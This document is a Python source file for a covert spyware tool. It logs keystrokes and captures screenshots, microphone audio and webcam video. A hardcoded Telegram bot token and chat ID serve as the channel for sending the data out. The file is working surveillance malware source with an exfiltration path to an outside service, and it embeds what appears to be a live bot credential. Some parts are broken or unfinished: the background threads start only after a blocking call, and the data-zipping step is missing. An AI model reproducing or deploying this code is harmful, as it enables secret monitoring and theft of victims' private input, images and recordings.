import logging
import subprocess
import os
import datetime
import requests
import threading
import time
import zipfile
from telegram.ext import Updater, CommandHandler
from pynput.keyboard import Key, Listener
import pyaudio
import wave
import cv2
import pyautogui

# Configure logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Constants
TOKEN = "6672103339:AAHQrAHVnH32XU-0-EOVhWaE0gKyMWLr2Mo"
CHAT_ID = "5517521840"
SEND_INTERVAL = 60  # seconds
KEYSTROKE_BATCH_TIME = 5  # seconds
FILES = {
    "KEYSTROKES": 'keystrokes.txt',
    "SCREENSHOT": 'screenshot.png',
    "AUDIO": "audio_record.wav",
    "VIDEO": "video_capture.avi"
}

keystrokes = []
last_keystroke_time = datetime.datetime.now()

def send_telegram_message(message, chat_id=CHAT_ID, token=TOKEN, file_path=None, file_type=None):
    """Send message or files to Telegram."""
    url = f"https://api.telegram.org/bot{token}/sendMessage" if not file_path else \
          f"https://api.telegram.org/bot{token}/send{file_type.capitalize()}"
    files = None
    data = {'chat_id': chat_id, 'text': message} if not file_path else {'chat_id': chat_id}
    if file_path:
        with open(file_path, 'rb') as f:
            files = {file_type: f}
            response = requests.post(url, files=files, data=data)
    else:
        response = requests.post(url, data=data)
    if response.status_code == 200:
        logging.debug("Message sent to Telegram successfully.")
    else:
        logging.error("Failed to send message to Telegram.")

def record_audio(duration=5, output_filename="audio_record.wav"):
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    CHUNK = 1024
    audio = pyaudio.PyAudio()
    try:
        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        with wave.open(output_filename, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
    finally:
        audio.terminate()


def capture_video(duration=5, output_filename="video_capture.avi"):
    # Start of the function block, so this line needs to be indented
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(output_filename, fourcc, 20.0, (640, 480))
    start_time = time.time()
    while int(time.time() - start_time) < duration:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
    cap.release()
    out.release()

def take_screenshot(output_filename=FILES["SCREENSHOT"]):
    screenshot = pyautogui.screenshot()
    screenshot.save(output_filename)

def write_keystrokes(batch, filepath=FILES["KEYSTROKES"]):
    with open(filepath, 'a') as file:
        file.write(f"{batch}\n")

def on_press(key):
    global last_keystroke_time, keystrokes
    if key == Key.esc:
        return False
    try:
        if key.char.isalnum() and (datetime.datetime.now() - last_keystroke_time).seconds >= KEYSTROKE_BATCH_TIME:
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            batch = f"{timestamp}: {''.join(keystrokes)}"
            write_keystrokes(batch)
            keystrokes.clear()
            last_keystroke_time = datetime.datetime.now()
        elif key.char.isalnum():
            keystrokes.append(key.char)
    except AttributeError:
        pass  # Ignore non-alphanumeric keys

def keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def periodic_tasks():
    while True:
        take_screenshot()
        record_audio()
        capture_video()
        # Implement zip_data() and send via send_telegram_message
        time.sleep(SEND_INTERVAL)

def main():
    # Set up the Telegram bot and command handlers
    updater = Updater(TOKEN)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", lambda update, context: send_telegram_message("Bot started!", chat_id=update.effective_chat.id)))
    # Add other command handlers
    updater.start_polling()
    updater.idle()

    # Start background tasks
    threading.Thread(target=periodic_tasks, daemon=True).start()
    threading.Thread(target=keylogger, daemon=True).start()

if __name__ == "__main__":
    main()
